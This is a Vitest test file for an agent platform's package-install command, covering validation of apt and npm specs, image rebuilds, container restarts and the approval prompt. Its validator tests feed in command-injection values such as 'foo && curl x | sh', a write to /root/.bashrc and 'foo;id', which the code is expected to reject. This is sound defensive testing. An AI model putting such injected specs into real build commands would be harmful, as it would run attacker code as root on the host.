/**
 * config-agent-add-package — spec validation and the fold-in rebuild path.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../../log.js', () => ({
  log: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

const mockBuildAgentGroupImage = vi.fn().mockResolvedValue(undefined);
vi.mock('../../container-runner.js', () => ({
  buildAgentGroupImage: (...args: unknown[]) => mockBuildAgentGroupImage(...args),
}));

const mockRestartAgentGroupContainers = vi.fn().mockReturnValue(1);
vi.mock('../../container-restart.js', () => ({
  restartAgentGroupContainers: (...args: unknown[]) => mockRestartAgentGroupContainers(...args),
}));

vi.mock('../../bootstrap.js', () => ({
  getTheAgent: () => ({ id: 'g1', name: 'Luna' }),
}));

vi.mock('../../db/agent-groups.js', () => ({
  getAgentGroup: (id: string) => ({ id, name: 'Luna' }),
}));

// Keep stored config in memory — the real path writes to `agent/container.json`.
let storedPackages: { apt: string[]; npm: string[] };
const mockUpdate = vi.fn();
vi.mock('../../container-config.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../container-config.js')>();
  return {
    ...actual,
    readStoredContainerConfig: () => ({
      mcpServers: {},
      packages: storedPackages,
      additionalMounts: [],
      skills: 'all',
      cliScope: 'agent',
    }),
    updateStoredContainerConfig: (...args: unknown[]) => mockUpdate(...args),
  };
});

import { lookup } from '../registry.js';
import type { CallerContext } from '../frame.js';
import './agent-config.js';

const HOST: CallerContext = { caller: 'host' };
const AGENT: CallerContext = {
  caller: 'agent',
  sessionId: 's1',
  agentGroupId: 'g1',
  messagingGroupId: 'mg1',
};

function cmd() {
  const def = lookup('config-agent-add-package');
  if (!def) throw new Error('config-agent-add-package not registered');
  return def;
}

async function run(raw: Record<string, unknown>, ctx: CallerContext = HOST) {
  const def = cmd();
  def.validateArgs?.(raw);
  return def.handler(def.parseArgs(raw), ctx);
}

beforeEach(() => {
  storedPackages = { apt: [], npm: [] };
  vi.clearAllMocks();
  mockBuildAgentGroupImage.mockResolvedValue(undefined);
  mockRestartAgentGroupContainers.mockReturnValue(1);
});

describe('config-agent-add-package validateArgs', () => {
  it('accepts plain package names', () => {
    expect(() => cmd().validateArgs?.({ apt: 'imagemagick' })).not.toThrow();
    expect(() => cmd().validateArgs?.({ npm: '@scope/pkg@1.2.3' })).not.toThrow();
  });

  it('rejects a spec that would inject into the root RUN line', () => {
    expect(() => cmd().validateArgs?.({ apt: 'foo && curl x | sh' })).toThrow(/Invalid apt package spec/);
    expect(() => cmd().validateArgs?.({ npm: "pkg' >> /root/.bashrc #" })).toThrow(/Invalid npm package spec/);
  });

  it('ignores absent flags rather than rejecting them', () => {
    expect(() => cmd().validateArgs?.({ rebuild: 'true' })).not.toThrow();
  });
});

describe('config-agent-add-package handler', () => {
  it('records an apt package without rebuilding by default', async () => {
    const result = await run({ apt: 'imagemagick' });

    expect(mockUpdate).toHaveBeenCalledWith('g1', { packages: { apt: ['imagemagick'], npm: [] } });
    expect(mockBuildAgentGroupImage).not.toHaveBeenCalled();
    expect(result).toMatchObject({ added: { apt: 'imagemagick', npm: null } });
  });

  it('does not duplicate an already-recorded package', async () => {
    storedPackages = { apt: ['imagemagick'], npm: [] };
    await run({ apt: 'imagemagick' });

    expect(mockUpdate).toHaveBeenCalledWith('g1', { packages: { apt: ['imagemagick'], npm: [] } });
  });

  it('requires at least one of --apt / --npm', async () => {
    await expect(run({})).rejects.toThrow(/Provide --apt/);
  });

  // Not redundant with validateArgs: host callers and the post-approval
  // re-dispatch reach the handler with the raw frame.
  it('re-validates at the handler boundary', async () => {
    const def = cmd();
    await expect(def.handler(def.parseArgs({ apt: 'foo;id' }), HOST)).rejects.toThrow(/Invalid apt package spec/);
  });

  it('builds then restarts with the resume message when --rebuild is set', async () => {
    const result = await run({
      apt: 'imagemagick',
      rebuild: 'true',
      message: 'imagemagick is ready — finish the resize',
    });

    expect(mockBuildAgentGroupImage).toHaveBeenCalledWith('g1');
    expect(mockRestartAgentGroupContainers).toHaveBeenCalledWith(
      'g1',
      'package install',
      'imagemagick is ready — finish the resize',
    );
    expect(result).toMatchObject({ rebuilt: true, restarted: 1 });
  });

  it('records the package before building, so a failed build leaves it queued', async () => {
    mockBuildAgentGroupImage.mockRejectedValue(new Error('build failed'));

    await expect(run({ apt: 'imagemagick', rebuild: 'true' })).rejects.toThrow(/build failed/);
    expect(mockUpdate).toHaveBeenCalledWith('g1', { packages: { apt: ['imagemagick'], npm: [] } });
    expect(mockRestartAgentGroupContainers).not.toHaveBeenCalled();
  });
});

describe('config-agent-add-package approvalCard', () => {
  it('shows the resulting list and warns that the build runs as root', () => {
    storedPackages = { apt: ['jq'], npm: [] };
    const card = cmd().approvalCard?.({ apt: 'imagemagick', rebuild: 'true' }, AGENT);

    expect(card?.title).toBe('Install package: imagemagick');
    expect(card?.question).toContain('resulting apt list: jq imagemagick');
    expect(card?.question).toContain('as root on this host');
  });

  it('says the change is inert without a rebuild', () => {
    const card = cmd().approvalCard?.({ apt: 'imagemagick' }, AGENT);

    expect(card?.question).toContain('records the package only');
    expect(card?.question).not.toContain('as root on this host');
  });
});
